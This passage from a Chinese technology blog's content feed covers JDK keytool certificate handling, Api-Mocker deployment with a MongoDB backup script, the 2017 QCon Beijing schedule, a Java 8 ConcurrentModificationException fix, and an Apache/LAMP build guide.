<h3 id="查看jdk证书"><a href="#查看jdk证书" class="headerlink" title="查看jdk证书"></a>查看jdk证书</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -list -keystore &quot;%JAVA_HOME%/jre/lib/security/cacerts&quot;</span><br></pre></td></tr></table></figure>

<h3 id="jdk密钥库操作"><a href="#jdk密钥库操作" class="headerlink" title="jdk密钥库操作"></a>jdk密钥库操作</h3><p><strong>修改密码</strong></p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -storepasswd -keystore &quot;%JAVA_HOME%/jre/lib/security/cacerts&quot;</span><br></pre></td></tr></table></figure>

<p><strong>导入证书</strong></p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -import -noprompt -trustcacerts -alias &lt;AliasName&gt; -file   &lt;certificate&gt; -keystore &lt;KeystoreFile&gt; -storepass &lt;Password&gt;</span><br></pre></td></tr></table></figure>

<p><strong>删除证书</strong></p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -delete -alias &lt;keyAlias&gt; -keystore &lt;keystore-name&gt; -storepass &lt;password&gt;</span><br></pre></td></tr></table></figure>

<h3 id="cocos-creator中打包原生android应用时，使用android-studio中的证书"><a href="#cocos-creator中打包原生android应用时，使用android-studio中的证书" class="headerlink" title="cocos creator中打包原生android应用时，使用android studio中的证书"></a>cocos creator中打包原生android应用时，使用android studio中的证书</h3><p>找到构建好的原生android项目，修改其中gradle.properties文件，添加：</p>
  <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">systemProp.javax.net.ssl.trustStore</span>=<span class="string">&#123;your-android-studio-directory&#125;\\jre\\jre\\lib\\security\\cacerts</span></span><br><span class="line"><span class="attr">systemProp.javax.net.ssl.trustStorePassword</span>=<span class="string">changeit</span></span><br></pre></td></tr></table></figure>
<p>这将让cocos使用android studio的证书，然后在android studio中配置证书：Preference-&gt;Tools-&gt;Server Certification中添加证书</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>https</tag>
        <tag>ca</tag>
      </tags>
  </entry>
  <entry>
    <title>Api-Mocker</title>
    <url>/technology/2017/09/Api-Mocker/</url>
    <content><![CDATA[<h1 id="Api-Mocker"><a href="#Api-Mocker" class="headerlink" title="Api-Mocker"></a>Api-Mocker</h1><p><code>Api-Mocker</code>是 <a href="http://www.dxy.cn/"><code>丁香园</code></a> 前端团队开源的一款接口管理软件。集诸如阿里开源的Rap、Chrome的postman等接口相关工具的优点于一身。 <a href="https://github.com/DXY-F2E/api-mocker">github地址</a></p>
<h1 id="生产环境部署"><a href="#生产环境部署" class="headerlink" title="生产环境部署"></a>生产环境部署</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">先安装好mongo(略)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开始生产环境部署</span></span><br><span class="line">git clone https://github.com/DXY-F2E/api-mocker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">make install将启动mongodb</span></span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">vim client/config/index.js</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改serverRoot: <span class="string">&#x27;demo.domain.cn/mock-api&#x27;</span></span></span><br><span class="line">vim server/config/config.prod.js</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改clientRoot: <span class="string">&#x27;http://demo.domain.cn/mock&#x27;</span></span></span><br><span class="line"></span><br><span class="line">make prod_client</span><br><span class="line">make prod_server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置密码加密加盐</span></span><br><span class="line">vim server/config/config.default.js</span><br><span class="line">md5Key: &#x27;demo-salt&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置找回密码邮件发送</span></span><br><span class="line">vim server/config/config.default.js</span><br><span class="line">transporter: &#123;</span><br><span class="line">  appName: &#x27;Api Mocker&#x27;,</span><br><span class="line">  host: &#x27;smtp.qq.com&#x27;,</span><br><span class="line">  secure: true,</span><br><span class="line">  port: 465,</span><br><span class="line">  auth: &#123;</span><br><span class="line">    user: &#x27;demo@qq.com&#x27;,</span><br><span class="line">    pass: &#x27;demo-auth-code&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">vim server/config/config.prod.js</span><br><span class="line">clientRoot: &#x27;http://demo.domain.cn/mock&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="Mongodb数据备份方案"><a href="#Mongodb数据备份方案" class="headerlink" title="Mongodb数据备份方案"></a>Mongodb数据备份方案</h1><p>部署 <code>api-mocker</code> 后服务一直运行，没有备份过数据。一次服务器断电重启后发现mongo的数据全部丢失。因此整个简单的备份方案。</p>
<p>有三种方案可以选择，参考<a href="https://www.mongodb.com/blog/post/mongodb-backup-strategies-compared">方案选择</a>。这里选用mongo自带的套装命令 <code>mongodump</code> <code>mongorestore</code></p>
<h2 id="备份脚本"><a href="#备份脚本" class="headerlink" title="备份脚本"></a>备份脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/zsh</span></span><br><span class="line">MONGO_DATABASE=&quot;api-mock&quot;</span><br><span class="line">APP_NAME=&quot;mongo-bak&quot;</span><br><span class="line"></span><br><span class="line">MONGO_HOST=&quot;127.0.0.1&quot;</span><br><span class="line">MONGO_PORT=&quot;27017&quot;</span><br><span class="line">TIMESTAMP=`date +%F-%H%M`</span><br><span class="line">MONGO=&quot;/opt/mongodb-linux-x86_64-3.0.6/bin/mongo&quot;</span><br><span class="line">MONGODUMP=&quot;/opt/mongodb-linux-x86_64-3.0.6/bin/mongodump&quot;</span><br><span class="line">BACKUPS_DIR=&quot;/var/backups/$APP_NAME&quot;</span><br><span class="line">BACKUP_NAME=&quot;$APP_NAME-$TIMESTAMP&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">锁库</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">MONGO admin --<span class="built_in">eval</span> <span class="string">&quot;printjson(db.fsyncLock())&quot;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">MONGODUMP -d <span class="variable">$MONGO_DATABASE</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">远程备份用下面注释的这条</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="variable">$MONGODUMP</span> -h <span class="variable">$MONGO_HOST</span>:<span class="variable">$MONGO_PORT</span> -d <span class="variable">$MONGO_DATABASE</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解锁</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">MONGO admin --<span class="built_in">eval</span> <span class="string">&quot;printjson(db.fsyncUnlock())&quot;</span></span></span><br><span class="line"></span><br><span class="line">mkdir -p $BACKUPS_DIR</span><br><span class="line">mv dump $BACKUP_NAME</span><br><span class="line">tar -zcvf $BACKUPS_DIR/$BACKUP_NAME.tgz $BACKUP_NAME</span><br><span class="line">rm -rf $BACKUP_NAME</span><br></pre></td></tr></table></figure>

<h2 id="恢复数据"><a href="#恢复数据" class="headerlink" title="恢复数据"></a>恢复数据</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongorestore $mongo-bak-dir</span><br></pre></td></tr></table></figure>

<h2 id="mongo基本命令"><a href="#mongo基本命令" class="headerlink" title="mongo基本命令"></a>mongo基本命令</h2><p>用以下命令可以简单测试备份及数据恢复</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入mongo CLI</span></span><br><span class="line">mongo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询所有库</span></span><br><span class="line">show dbs</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择库</span></span><br><span class="line">use $db-name</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询所有集合</span></span><br><span class="line">show collections</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询集合中的所有文档</span></span><br><span class="line">db.$col-name.find().pretty()</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除集合中是所有文档</span></span><br><span class="line">db.$col-name.remove(&#123;&#125;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除库</span></span><br><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>

<h2 id="定时备份"><a href="#定时备份" class="headerlink" title="定时备份"></a>定时备份</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建定时任务文件</span></span><br><span class="line">crontab $cron-file-name</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入规则每天0点、12点备份一次</span></span><br><span class="line">vim $cron-file-name</span><br><span class="line">0 0,12 */1 * * $backup-shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动定时任务</span></span><br><span class="line">crontab $cron-file-name</span><br></pre></td></tr></table></figure>

<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ol>
<li>投入使用前最好先配置密码加密盐，以后配置用户密码迁移成本高</li>
<li>接口文档重写很操蛋，务必备份mongo数据！！！</li>
<li>太旧的备份文件最好也写个脚本定时清理一下</li>
</ol>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>接口规范</tag>
        <tag>node</tag>
        <tag>mongo</tag>
        <tag>ops</tag>
      </tags>
  </entry>
  <entry>
    <title>2017_QCON日程</title>
    <url>/technology/2017/04/2017_QCON%E6%97%A5%E7%A8%8B/</url>
    <content><![CDATA[<blockquote>
<p>2017 QCON全球软件开发大会 北京·国家会议中心 04.16~04.18</p>
<p>地址及日程如下</p>
</blockquote>
<p><img src="http://img.willowspace.cn/willowspace_2016/1492109894337.png"></p>
<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="主题演讲-大会堂A"><a href="#主题演讲-大会堂A" class="headerlink" title="主题演讲 大会堂A"></a>主题演讲 大会堂A</h2><ul>
<li>09:00 开场致辞&amp;<a href="http://2017.qconbeijing.com/presentation/803">持续集成之 Why、What &amp; How</a> CloudBees CTO，Jenkins 创始人和主要开发者 Kohsuke Kawaguchi（川口耕介）</li>
</ul>
<h2 id="微服务与实时处理架构演进（厂商共建）-306B"><a href="#微服务与实时处理架构演进（厂商共建）-306B" class="headerlink" title="微服务与实时处理架构演进（厂商共建） 306B"></a><a href="http://2017.qconbeijing.com/track/128">微服务与实时处理架构演进（厂商共建）</a> 306B</h2><ul>
<li>10:30 <a href="http://2017.qconbeijing.com/presentation/846">在业务量暴增中痛并快乐——数据交易平台的成长记事</a> TalkingData 数据工程师 赵志刚</li>
</ul>
<h2 id="Google、Uber-的分布式系统设计-311A"><a href="#Google、Uber-的分布式系统设计-311A" class="headerlink" title="Google、Uber 的分布式系统设计 311A"></a><a href="http://2017.qconbeijing.com/track/139">Google、Uber 的分布式系统设计</a> 311A</h2><ul>
<li>11:30 <a href="http://2017.qconbeijing.com/presentation/810">使用一致协议来实现数据复制</a> Uber Senior Software Engineer 王盟</li>
</ul>
<h2 id="互联网新挑战-甲骨文黑科技（厂商专场）-306B"><a href="#互联网新挑战-甲骨文黑科技（厂商专场）-306B" class="headerlink" title="互联网新挑战 甲骨文黑科技（厂商专场） 306B"></a><a href="http://2017.qconbeijing.com/track/138">互联网新挑战 甲骨文黑科技（厂商专场）</a> 306B</h2><ul>
<li>14:00  <a href="http://2017.qconbeijing.com/presentation/862">Java 9 新特性介绍及 Jigsaw 一览</a> 甲骨文首席工程师 杨晓峰</li>
</ul>
<h2 id="人工智能与深度学习-311A"><a href="#人工智能与深度学习-311A" class="headerlink" title="人工智能与深度学习 311A"></a><a href="http://2017.qconbeijing.com/track/69">人工智能与深度学习</a> 311A</h2><ul>
<li>14:55 <a href="http://2017.qconbeijing.com/presentation/624">经典算法与人工智能在外卖物流调度中的应用</a> 百度外卖资深策略架构师 徐明泉</li>
</ul>
<h2 id="快速进化的容器生态-309B"><a href="#快速进化的容器生态-309B" class="headerlink" title="快速进化的容器生态 309B"></a><a href="http://2017.qconbeijing.com/track/60">快速进化的容器生态</a> 309B</h2><ul>
<li>16:00 <a href="http://2017.qconbeijing.com/presentation/523">容器编排方案 Swarm 的演进</a> 阿里云高级专家 陈萌辉</li>
</ul>
<h2 id="新一代-APM-技术（厂商专场）-306A"><a href="#新一代-APM-技术（厂商专场）-306A" class="headerlink" title="新一代 APM 技术（厂商专场） 306A"></a><a href="http://2017.qconbeijing.com/track/140">新一代 APM 技术（厂商专场）</a> 306A</h2><ul>
<li>16:55 <a href="http://2017.qconbeijing.com/presentation/897">Oracle 和 MySQL 性能优化感悟</a> 搜狐搜狐畅游 DBA 杨建荣</li>
</ul>
<h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><h2 id="主题演讲-大会堂A-1"><a href="#主题演讲-大会堂A-1" class="headerlink" title="主题演讲 大会堂A"></a>主题演讲 大会堂A</h2><ul>
<li>09:00 <a href="http://2017.qconbeijing.com/presentation/877">人工智能驱动智慧零售</a> 京东集团副总裁、京东商城研发体系负责人 马松</li>
</ul>
<h2 id="推荐系统架构演进-307A"><a href="#推荐系统架构演进-307A" class="headerlink" title="推荐系统架构演进 307A"></a><a href="http://2017.qconbeijing.com/track/126">推荐系统架构演进</a> 307A</h2><ul>
<li>11:45 <a href="http://2017.qconbeijing.com/presentation/725">今日头条推荐系统架构设计实践</a> 今日头条资深研发工程师 金敬亭</li>
</ul>
<h2 id="业务架构那些事-310"><a href="#业务架构那些事-310" class="headerlink" title="业务架构那些事 310"></a><a href="http://2017.qconbeijing.com/track/62">业务架构那些事</a> 310</h2><ul>
<li>14:00 <a href="http://2017.qconbeijing.com/presentation/759">微信红包后台系统可用性设计实践</a> 腾讯高级工程师 方乐明</li>
<li>14:55 <a href="http://2017.qconbeijing.com/presentation/660">QQ 空间平台百亿级流量的社交广告系统海量实践</a> 腾讯 QQ 空间营收功能后台技术负责人 冯启航</li>
<li>16:00 <a href="http://2017.qconbeijing.com/presentation/816">企业代码安全最佳实践</a> 美丽联合集团资深安全专家，Cobra 作者 止介</li>
<li>16:55 <a href="http://2017.qconbeijing.com/presentation/820">从 Linux 系统内核层面来解决实际问题的实战经验</a> 美丽联合集团蘑菇街技术专家 邵亚方</li>
</ul>
<h1 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h1><h2 id="容器应用与工程效率提升（厂商共建）-大会堂A"><a href="#容器应用与工程效率提升（厂商共建）-大会堂A" class="headerlink" title="容器应用与工程效率提升（厂商共建） 大会堂A"></a><a href="http://2017.qconbeijing.com/track/130">容器应用与工程效率提升（厂商共建）</a> 大会堂A</h2><ul>
<li>09:30 <a href="http://2017.qconbeijing.com/presentation/851">基于 Docker 的全自动化性能测试平台</a> 秦苍科技高级测试工程师 于国庆</li>
</ul>
<h2 id="网络信息安全建设最佳实践-307A"><a href="#网络信息安全建设最佳实践-307A" class="headerlink" title="网络信息安全建设最佳实践 307A"></a><a href="http://2017.qconbeijing.com/track/74">网络信息安全建设最佳实践</a> 307A</h2><ul>
<li>10:30 <a href="http://2017.qconbeijing.com/presentation/720">代码未写，漏洞已出——谈谈设计不当导致的安全问题</a> 腾讯玄武实验室总监 于旸（TK）</li>
<li>11:25 <a href="http://2017.qconbeijing.com/presentation/618">甲方安全从 0 到 1</a> bilibili 安全团队负责人 吴文灏</li>
</ul>
<h2 id="大规模分布式系统架构与实践-310"><a href="#大规模分布式系统架构与实践-310" class="headerlink" title="大规模分布式系统架构与实践 310"></a><a href="http://2017.qconbeijing.com/track/76">大规模分布式系统架构与实践</a> 310</h2><ul>
<li>13:30 <a href="http://2017.qconbeijing.com/presentation/745">PaxosStore：微信跨数据中心强一致存储系统</a> 微信存储系统主要负责人 曾楚伟</li>
<li>14:25 <a href="http://2017.qconbeijing.com/presentation/663">从百度文件系统看大型分布式系统设计中的定式与创新</a> 百度搜索架构师 颜世光</li>
<li>15:30 <a href="http://2017.qconbeijing.com/presentation/646">对 2000 多亿条数据做一次 group by 需要多久？</a> 腾讯社交与效果广告部检索系统组主管 易杰</li>
</ul>
<h2 id="17-10-演讲结束"><a href="#17-10-演讲结束" class="headerlink" title="17:10 演讲结束"></a>17:10 演讲结束</h2><blockquote>
<p>附：</p>
</blockquote>
<p><a href="http://2017.qconshanghai.com/schedule">2017上海QCON日程链接</a></p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>QCON</tag>
        <tag>Conference</tag>
      </tags>
  </entry>
  <entry>
    <title>Java8 Collections::sort引起的ConcurrentModificationException</title>
    <url>/technology/2017/09/Java8-Collections-sort%E5%BC%95%E8%B5%B7%E7%9A%84ConcurrentModificationException/</url>
    <content><![CDATA[<h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>生产环境(JDK8u144)中有部分公共数据存在xml中，使用时会将xml数据读取到内存，以 <code>ArrayList</code> 存储，多个用户(多线程)对同一个 <code>ArrayList</code>  使用了 <code>Collections</code> 的sort(List,Comparator)方法进行排序，从而触发了 <code>ConcurrentModificationException</code>。其本质就是一个并发问题。</p>
<h1 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testConcurrentModificationException</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">  <span class="comment">//初始化ArrayList</span></span><br><span class="line">  List&lt;Integer&gt; dataList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">      dataList.add(random.nextInt(<span class="number">10</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  System.out.println(<span class="string">&quot;initialize &quot;</span> + dataList.stream().map(Objects::toString).collect(Collectors.joining(<span class="string">&quot;,&quot;</span>)));</span><br><span class="line">  <span class="comment">//初始化排序任务</span></span><br><span class="line">  <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">      Collections.sort(dataList, Integer::compareTo);</span><br><span class="line">      System.out.println(<span class="string">&quot;thread[&quot;</span> + Thread.currentThread().getId() + <span class="string">&quot;] &quot;</span> + dataList.stream().map(Objects::toString).collect(Collectors.joining(<span class="string">&quot;,&quot;</span>)));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">//模拟多线程环境对同一个ArraList进行排序</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">      ThreadPool.execute(runnable);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上Test Case将复现 <code>ConcurrentModificationException</code> 异常</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1506285531798.png?imageMogr2/thumbnail/800"></p>
<p>#ConcurrentModificationException</p>
<p>顾名思义,<code>ConcurrentModificationException</code> 是并发修改引起的异常。追溯 <code>JDK8u144</code> 的 <code>Collections::sort</code> 实现可以发现，最终调用的是ArrayList的sort方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Collections::sort</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(List&lt;T&gt; list, Comparator&lt;? <span class="built_in">super</span> T&gt; c)</span> &#123;</span><br><span class="line">    list.sort(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ArrayList::sort</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; c)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount;</span><br><span class="line">    Arrays.sort((E[]) elementData, <span class="number">0</span>, size, c);</span><br><span class="line">    <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在 <code>JDK8u20</code> 之前</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testConcurrentModificationException</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">    List&lt;Integer&gt; dataList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        dataList.add(random.nextInt(<span class="number">10</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;initialize &#123;&#125;&quot;</span> + dataList.stream().map(Objects::toString).collect(Collectors.joining(<span class="string">&quot;,&quot;</span>)));</span><br><span class="line">    <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (random) &#123;</span><br><span class="line">            Collections.sort(dataList, Integer::compareTo);</span><br><span class="line">            System.out.println(<span class="string">&quot;thread[&quot;</span> + Thread.currentThread().getId() + <span class="string">&quot;] &quot;</span> + dataList.stream().map(Objects::toString).collect(Collectors.joining(<span class="string">&quot;,&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        ThreadPool.execute(runnable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用-CopyOnWriteArrayList"><a href="#使用-CopyOnWriteArrayList" class="headerlink" title="使用 CopyOnWriteArrayList"></a>使用 <code>CopyOnWriteArrayList</code></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testConcurrentModificationException</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">    List&lt;Integer&gt; dataList = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        dataList.add(random.nextInt(<span class="number">10</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;initialize &#123;&#125;&quot;</span> + dataList.stream().map(Objects::toString).collect(Collectors.joining(<span class="string">&quot;,&quot;</span>)));</span><br><span class="line">    <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            Collections.sort(dataList, Integer::compareTo);</span><br><span class="line">            System.out.println(<span class="string">&quot;thread[&quot;</span> + Thread.currentThread().getId() + <span class="string">&quot;] &quot;</span> + dataList.stream().map(Objects::toString).collect(Collectors.joining(<span class="string">&quot;,&quot;</span>)));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        ThreadPool.execute(runnable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>java8</tag>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 应用采用 Docker 容器化的最佳实践</title>
    <url>/technology/2024/06/Java-%E5%BA%94%E7%94%A8%E9%87%87%E7%94%A8-Docker-%E5%AE%B9%E5%99%A8%E5%8C%96%E7%9A%84%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>LAMP环境搭建</title>
    <url>/technology/2017/06/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>linux+apache+mysql+php，linux及mysql略，本文介绍apache上部署php。</p>
<h1 id="一、安装apache"><a href="#一、安装apache" class="headerlink" title="一、安装apache"></a>一、安装apache</h1><p><strong>下载apache相关资源</strong></p>
<p><a href="http://httpd.apache.org/download.cgi">httpd(apache)</a></p>
<p><a href="http://apr.apache.org/download.cgi">apr(apache portable runtime)</a></p>
<p><a href="http://archive.apache.org/dist/apr/apr-util-1.5.2.tar.gz">apr-util</a></p>
<p><strong>apr及apr-util移至httpd的srclib目录下</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -rf apr-1.5.2 /srv/httpd-2.4.25/srclib/apr</span><br><span class="line">cp -rf apr-util-1.5.2 /srv/httpd-2.4.25/srclib/apr-util</span><br></pre></td></tr></table></figure>

<p><strong>apr编译安装</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /srv/httpd-2.4.25/srclib/apr</span><br><span class="line">./configure --prefix=/srv/httpd-2.4.25/srclib/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><strong>apr-util编译安装</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /srv/httpd-2.4.25/srclib/apr-util</span><br><span class="line">./configure --prefix=/srv/httpd-2.4.25/srclib/apr-util --with-apr=/srv/httpd-2.4.25/srclib/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><strong>libpcre安装</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libpcre3-dev</span><br></pre></td></tr></table></figure>

<p>apache2.4中文文档__</p>
<p><a href="http://httpd.apache.org/docs/2.4/">http://httpd.apache.org/docs/2.4/</a></p>
<p><strong>httpd配置项</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--prefix=/usr/local/apache2 ：指定安装目标路径</span><br><span class="line">--sysconfdir=/etc/apache2/conf ：指定配置文件安装位置</span><br><span class="line">--enable-so ：支持动态共享模块，如果没有这个模块PHP将无法与apache结合工作</span><br><span class="line">--enable-rewirte ：支持URL重写</span><br><span class="line">--enable-ssl ：启用支持ssl</span><br><span class="line">--enable-cgi ：启用支持cgi</span><br><span class="line">--enable-cgid :启用支持带线状图形的CGI脚本 MPMs</span><br><span class="line">--enable-modules=most ：安装大多数模块</span><br><span class="line">--enable-modules-shared=most ：安装大多数共享模块</span><br><span class="line">--enable-mpms-shared=all ：支持全部多道处理方式</span><br><span class="line">--with-apr=/usr/local/apr ：指定apr路径</span><br><span class="line">--with-apr-util=/usr/local/apr-util ：指定apr-util路径</span><br></pre></td></tr></table></figure>

<p><strong>编译安装启动</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/opt/httpd-2.4.25</span></span><br><span class="line">./configure --prefix=/srv/apache2 --enable-so --enable-rewirte --with-apr=/srv/httpd-2.4.25/srclib/apr --with-apr-util=/srv/httpd-2.4.25/srclib/apr-util</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改端口 /srv/apache2/conf/httpd.conf</span></span><br><span class="line">Listen 8000</span><br><span class="line">ServerName $&#123;intranet_ip&#125;:8000</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动apache服务器 /srv/apache2</span></span><br><span class="line">./bin/apachectl start</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问8000端口显示It works则说明成功</span></span><br></pre></td></tr></table></figure>

<p><strong>安装遇到warning: setlocale: LC_CTYPE: cannot change locale (UTF-8)</strong></p>
<p>参考<a href="http://blog.csdn.net/aca_jingru/article/details/45557027">warning: setlocale: LC_CTYPE: cannot change locale</a></p>
